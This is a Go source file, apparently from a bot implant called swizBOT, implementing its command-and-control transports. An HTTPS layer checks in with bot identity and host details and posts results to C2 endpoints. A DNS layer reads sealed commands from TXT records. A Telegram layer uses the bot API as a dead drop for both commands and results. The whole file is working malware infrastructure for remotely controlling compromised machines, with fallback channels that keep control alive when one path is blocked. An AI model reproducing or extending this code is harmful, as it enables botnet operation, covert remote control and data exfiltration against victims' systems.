package main

import (
	"bytes"
	"context"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"strings"
	"time"

	"github.com/saviorSEC/swizBOT/internal/transport"
)

// frameTag marks a sealed frame carried over a non-HTTP fallback channel
// (DNS TXT record, Telegram message text). The payload is the raw AEAD
// frame, base64url-encoded so it survives text channels.
const frameTag = "swiz1:"

func encodeFrame(b []byte) string {
	return frameTag + base64.RawURLEncoding.EncodeToString(b)
}

func decodeFrame(s string) ([]byte, bool) {
	s = strings.TrimSpace(s)
	if !strings.HasPrefix(s, frameTag) {
		return nil, false
	}
	b, err := base64.RawURLEncoding.DecodeString(strings.TrimPrefix(s, frameTag))
	if err != nil {
		return nil, false
	}
	return b, true
}

// --- HTTPS layer (primary) --------------------------------------------

type httpLayer struct{ c *C2Client }

func (l httpLayer) Name() string  { return "https" }
func (l httpLayer) Priority() int { return 10 }

func (l httpLayer) Poll(ctx context.Context) (transport.Frame, error) {
	c := l.c
	n := len(c.endpoints)
	if n == 0 {
		return transport.Frame{}, transport.ErrUnsupported
	}
	var lastErr error
	for i := 0; i < n; i++ {
		ep := c.nextEndpoint()
		if ep == "" {
			break
		}
		checkinURL := fmt.Sprintf("%s/checkin?bot_id=%s&os=%s&arch=%s&pub=%s",
			ep, urlQueryEscape(c.cfg.BotID), urlQueryEscape(runtimeGOOS()),
			urlQueryEscape(runtimeGOARCH()), urlQueryEscape(c.cryptoPubKeyHex()))

		req, err := http.NewRequestWithContext(ctx, http.MethodGet, checkinURL, nil)
		if err != nil {
			lastErr = err
			continue
		}
		c.authed(req)
		c.markCrypto(req)

		resp, err := c.http.Do(req)
		if err != nil {
			lastErr = err
			waitCtx(ctx, time.Duration(200+time.Now().UnixNano()%800)*time.Millisecond)
			continue
		}
		body, rerr := io.ReadAll(resp.Body)
		resp.Body.Close()
		if rerr != nil || resp.StatusCode != http.StatusOK {
			lastErr = fmt.Errorf("checkin %s: status %d", ep, resp.StatusCode)
			continue
		}
		return transport.Frame{
			Body:   body,
			Sealed: resp.Header.Get("X-Crypto") == "aead",
			Paused: resp.Header.Get("X-Paused") == "1",
		}, nil
	}
	if lastErr == nil {
		lastErr = errors.New("no reachable C2 endpoint")
	}
	return transport.Frame{}, lastErr
}

func (l httpLayer) Push(ctx context.Context, frame []byte) error {
	c := l.c
	if len(c.endpoints) == 0 {
		return transport.ErrUnsupported
	}
	var lastErr error
	for i := 0; i < len(c.endpoints); i++ {
		ep := c.nextEndpoint()
		if ep == "" {
			break
		}
		req, err := http.NewRequestWithContext(ctx, http.MethodPost,
			ep+"/result", bytes.NewReader(frame))
		if err != nil {
			lastErr = err
			continue
		}
		req.Header.Set("Content-Type", "application/octet-stream")
		c.authed(req)
		c.markCrypto(req)

		hr, err := c.http.Do(req)
		if err != nil {
			lastErr = err
			continue
		}
		io.Copy(io.Discard, hr.Body)
		hr.Body.Close()
		if hr.StatusCode == http.StatusOK {
			return nil
		}
		lastErr = fmt.Errorf("result %s: status %d", ep, hr.StatusCode)
	}
	if lastErr == nil {
		lastErr = errors.New("no reachable C2 endpoint")
	}
	return lastErr
}

// --- DNS layer (receive-only fallback) --------------------------------

// dnsLayer polls TXT records for a sealed command frame ("swiz1:<b64>").
// It is receive-only: pushing results over DNS needs operator-side query
// logging, so Push reports ErrUnsupported and the Manager skips it.
type dnsLayer struct{ c *C2Client }

func (l dnsLayer) Name() string  { return "dns" }
func (l dnsLayer) Priority() int { return 20 }

func (l dnsLayer) Poll(ctx context.Context) (transport.Frame, error) {
	domain := l.c.cfg.DNSDomain
	if domain == "" {
		return transport.Frame{}, transport.ErrUnsupported
	}
	if ctx.Err() != nil {
		return transport.Frame{}, ctx.Err()
	}
	txts, err := net.LookupTXT(domain)
	if err != nil {
		return transport.Frame{}, err
	}
	for _, t := range txts {
		for _, part := range strings.Fields(t) {
			if b, ok := decodeFrame(part); ok {
				return transport.Frame{Body: b, Sealed: true}, nil
			}
		}
	}
	return transport.Frame{}, nil // healthy, nothing queued
}

func (l dnsLayer) Push(ctx context.Context, frame []byte) error {
	return transport.ErrUnsupported
}

// --- Telegram dead-drop layer (fallback) ------------------------------

type telegramLayer struct{ c *C2Client }

func (l telegramLayer) Name() string  { return "telegram" }
func (l telegramLayer) Priority() int { return 30 }

func (l telegramLayer) Poll(ctx context.Context) (transport.Frame, error) {
	tok := l.c.cfg.TGToken
	if tok == "" {
		return transport.Frame{}, transport.ErrUnsupported
	}
	endpoint := "https://api.telegram.org/bot" + tok + "/getUpdates?timeout=0"
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, endpoint, nil)
	if err != nil {
		return transport.Frame{}, err
	}
	resp, err := l.c.http.Do(req)
	if err != nil {
		return transport.Frame{}, err
	}
	defer resp.Body.Close()

	var updates struct {
		OK     bool `json:"ok"`
		Result []struct {
			Message *struct {
				Chat *struct {
					ID json.Number `json:"id"`
				} `json:"chat"`
				Text string `json:"text"`
			} `json:"message"`
		} `json:"result"`
	}
	if err := json.NewDecoder(io.LimitReader(resp.Body, 1<<20)).Decode(&updates); err != nil {
		return transport.Frame{}, err
	}
	for _, u := range updates.Result {
		if u.Message == nil || u.Message.Text == "" {
			continue
		}
		if l.c.cfg.TGChatID != "" && u.Message.Chat != nil && u.Message.Chat.ID.String() != l.c.cfg.TGChatID {
			continue
		}
		if b, ok := decodeFrame(u.Message.Text); ok {
			return transport.Frame{Body: b, Sealed: true}, nil
		}
	}
	return transport.Frame{}, nil
}

func (l telegramLayer) Push(ctx context.Context, frame []byte) error {
	tok := l.c.cfg.TGToken
	chat := l.c.cfg.TGChatID
	if tok == "" || chat == "" {
		return transport.ErrUnsupported
	}
	form := url.Values{}
	form.Set("chat_id", chat)
	form.Set("text", encodeFrame(frame))
	endpoint := "https://api.telegram.org/bot" + tok + "/sendMessage"
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, endpoint, strings.NewReader(form.Encode()))
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	resp, err := l.c.http.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	io.Copy(io.Discard, resp.Body)
	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("telegram sendMessage: status %d", resp.StatusCode)
	}
	return nil
}
